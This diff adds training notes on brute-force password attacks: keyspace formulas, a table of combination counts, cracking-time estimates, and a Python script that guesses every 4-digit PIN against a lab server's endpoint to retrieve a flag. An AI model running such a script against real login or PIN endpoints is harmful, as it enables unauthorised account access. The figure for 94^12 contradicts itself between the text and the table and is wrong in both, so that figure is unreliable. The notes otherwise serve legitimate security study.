@@ -77,3 +77,73 @@ Organizations use password policies to enforce strong password practices:
 - **Strategic tool selection**: Complexity of passwords influences which brute force method is used.
 - **Resource allocation**: Time and power needed depend on password strength.
 - **Exploiting default credentials**: Default passwords are often the weakest points in security.
+
+---
+
+# Brute Force Attacks
+
+## Overview
+Brute force attacks are a method of cracking passwords, encryption keys, or PINs by systematically trying all possible combinations until the correct one is found. The complexity of brute-forcing increases exponentially as the password length and character set grow, which significantly affects the time and resources required to crack the password.
+
+## Mathematical Foundation of Brute Force
+### Formula:
+**Possible Combinations = Character Set Size ^ Password Length**
+
+Example:
+- **6-character password** with only lowercase letters (26 characters):  
+  `26^6 ≈ 300 million possible combinations`
+- **8-character password** with only lowercase letters:  
+  `26^8 ≈ 200 billion possible combinations`
+- **12-character password** with lowercase, uppercase, numbers, and symbols:  
+  `94^12 ≈ 475 trillion combinations`
+
+### Impact of Password Length and Complexity
+Increasing password length or character set (adding uppercase letters, numbers, symbols) exponentially increases the number of possible combinations, making brute-forcing more challenging.
+
+| **Password Length** | **Character Set**                               | **Possible Combinations**         |
+|---------------------|-------------------------------------------------|----------------------------------|
+| 6                   | Lowercase letters (a-z)                        | 26^6 ≈ 300 million              |
+| 8                   | Lowercase letters (a-z)                        | 26^8 ≈ 200 billion              |
+| 8                   | Lowercase + Uppercase letters (a-z, A-Z)       | 52^8 ≈ 53 trillion              |
+| 12                  | Lowercase + Uppercase + Numbers + Symbols      | 94^12 ≈ 475 trillion trillion   |
+
+## Brute Force Speed and Hardware Influence
+- **Basic Computer (1 million passwords/second)**:  
+  Adequate for cracking simple passwords, but becomes impractical for complex passwords.
+  - Example: Cracking an 8-character alphanumeric password would take ~6.92 years.
+  
+- **Supercomputer (1 trillion passwords/second)**:  
+  Greatly accelerates brute-forcing, but even with massive resources, cracking complex passwords can still take an impractical amount of time.
+  - Example: Cracking a 12-character password with all ASCII characters would take ~15,000 years.
+
+## Practical Example: Cracking a 4-Digit PIN
+The following Python script demonstrates a brute-force attack on a simple system that generates a random 4-digit PIN.
+
+### Python Code: `pin-solver.py`
+```python
+import requests
+
+ip = "127.0.0.1"  # Change this to your instance IP address
+port = 1234       # Change this to your instance port number
+
+# Try every possible 4-digit PIN (from 0000 to 9999)
+for pin in range(10000):
+    formatted_pin = f"{pin:04d}"  # Convert number to a 4-digit string (e.g., 7 becomes "0007")
+    print(f"Attempted PIN: {formatted_pin}")
+
+    # Send request to server
+    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
+
+    # Check if correct PIN found
+    if response.ok and 'flag' in response.json():  # .ok means status code 200
+        print(f"Correct PIN found: {formatted_pin}")
+        print(f"Flag: {response.json()['flag']}")
+        break
+```
+
+### Process:
+1. The script systematically attempts all possible PINs (0000 to 9999).
+2. It sends GET requests to a server endpoint `/pin` with each PIN.
+3. The server responds with success and a flag when the correct PIN is guessed.
+
+---
